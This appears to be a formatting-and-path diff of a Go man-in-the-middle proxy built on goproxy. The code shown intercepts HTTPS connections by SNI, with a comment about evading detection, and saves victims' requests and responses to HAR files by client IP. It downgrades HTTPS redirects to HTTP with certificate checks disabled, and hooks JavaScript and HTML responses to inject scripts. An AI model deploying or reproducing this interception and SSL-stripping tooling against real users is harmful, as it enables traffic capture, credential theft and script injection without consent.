@@ -23,7 +23,7 @@ const (
     CONN_HOST = "localhost"
     CONN_PORT = "8080"
     CONN_TYPE = "tcp"
-    SOURCE = "/Users/alex/go/src/mitm/public"
+    SOURCE = "/Users/jonas/dev/go/src/mitm/public"
 )
 // var listOfUsers map[string]struct{}
 var listener net.Listener
@@ -52,7 +52,7 @@ func initializeBlockReplaceLists(){
     }
 	log.Println("Redirecting: ", replace)
 }
- 
+
 //Gets the contents of the page that will replace the request
 func getBuffer(site string) string {
 	buf := bytes.NewBuffer(nil)
@@ -62,10 +62,10 @@ func getBuffer(site string) string {
 	  	log.Println("read error: ", err)
 	  	s = "<html><body><br><br><h1>This site is currently unavailable</h1></body></html>"
 	  } else {
-	  	io.Copy(buf, f)           // Error handling elided for brevity.	
+	  	io.Copy(buf, f)           // Error handling elided for brevity.
 		s = string(buf.Bytes())
 	  }
-	  
+
 	  f.Close()
 	return s
 }
@@ -97,7 +97,7 @@ func RedirectPage() net.Listener {
 		return goproxy.DONE
 	})
 	proxy.HandleRequest(goproxy.RequestHostContains(replace...)(pageRedirect))
-		
+
 	go http.Serve(listener, proxy)
     return listener
 }
@@ -121,7 +121,7 @@ func BlockWebsites() net.Listener {
 				Header: client_response_header,
 				ContentLength: int64(len(body)),
 			}
-						
+
 		    log.Println( client_response.Header )
 
 		    ctx.Resp = client_response
@@ -129,7 +129,7 @@ func BlockWebsites() net.Listener {
 			return goproxy.DONE
 	})
 	proxy.HandleRequest(goproxy.RequestHostContains(banned...)(pageBlocker))
-		
+
 	go http.Serve(listener, proxy)
     return listener
 }
@@ -163,12 +163,12 @@ func HTTPSInterceptor() net.Listener {
 
 		//potentially best to REJECT so that MITM is not detected.
 		//detection of MITM could cause suspicion
-		if ctx.SNIHost() != "" {	
+		if ctx.SNIHost() != "" {
 			log.Println("MITM-ddling: ", ctx.SNIHost())
 		    return goproxy.MITM
 		}
 		return goproxy.FORWARD
-		
+
 	})
 
 	proxy.HandleRequestFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
@@ -177,7 +177,7 @@ func HTTPSInterceptor() net.Listener {
 		t := time.Now().Local()
 		timestamp := t.Format("20060102150405")
 		proxy.FlushHARToDisk(SOURCE+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
-		
+
 		// When doing MITM, if we've rewritten the destination host, let,s sync the
 		// `Host:` header so the remote endpoints answers properly.
 		if ctx.IsThroughMITM {
@@ -187,7 +187,7 @@ func HTTPSInterceptor() net.Listener {
 		}
 		return goproxy.NEXT
 	})
-  	//handle 301 and 302s to HTTPS sites. Drop them to HTTPS only 
+  	//handle 301 and 302s to HTTPS sites. Drop them to HTTPS only
 	interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
 		log.Println("FUNC: logging to "+ctx.Host()+".har")
 		ctx.LogToHARFile(true)
@@ -195,7 +195,7 @@ func HTTPSInterceptor() net.Listener {
 		timestamp := t.Format("20060102150405")
 		// log.Println("timestamp: ", timestamp)
 		proxy.FlushHARToDisk(SOURCE + "/hars/res_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
-		
+
 		//if its a redirect
 		if ctx.Resp != nil && (strings.Contains(ctx.Resp.Status, "301") || strings.Contains(ctx.Resp.Status, "302")) {
 			//and its to an HTTPS page
@@ -206,7 +206,7 @@ func HTTPSInterceptor() net.Listener {
 				ctx.Resp.Request.URL.Host = strings.Replace(ctx.Host(), "https", "http", -1)
 				log.Println("---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
 				log.Println("<<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))
-	
+
 				tr := &http.Transport{
 		        	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		    	}
@@ -216,7 +216,7 @@ func HTTPSInterceptor() net.Listener {
 		        	log.Println(" help!: ", err)
 		    	}
 		    	log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))
-		    	
+
 		    	log.Println(server_ssl_response.TLS)
 		    	bs, err := ioutil.ReadAll(server_ssl_response.Body)
 		    	if err != nil {
@@ -235,7 +235,7 @@ func HTTPSInterceptor() net.Listener {
 					Body: ioutil.NopCloser(bytes.NewBufferString(body)),
 					Header: client_response_header,
 					ContentLength: int64(len(body)),
-				}							
+				}
 			    ctx.Resp = client_response
 			    return goproxy.FORWARD
 
@@ -257,9 +257,9 @@ func HTTPSInterceptor() net.Listener {
 				return goproxy.NEXT
 			}
 
-		} 
+		}
 			log.Println("neither of the above, we are forwarding data")
-			if strings.Contains(ctx.Resp.Request.URL.Path, "js") { //catch javascript files to embed the hook into 
+			if strings.Contains(ctx.Resp.Request.URL.Path, "js") { //catch javascript files to embed the hook into
 					log.Println("HTTP URL: ", ctx.Resp.Request.URL.Path)
 					// bs, err := ioutil.ReadAll(ctx.Resp.Body)
 			  //   	if err != nil {
@@ -311,7 +311,7 @@ func InjectScript(replace string, result string) net.Listener {
 		// log.Println("URL: ", ctx.Resp.Request.URL)
 		contentType := ctx.Resp.Header.Get("Content-Type")
 			if !strings.Contains(contentType, "html") {
-				return goproxy.NEXT	
+				return goproxy.NEXT
 			}
 			//start reading the response for editing
 			bs, err := ioutil.ReadAll(ctx.Resp.Body)
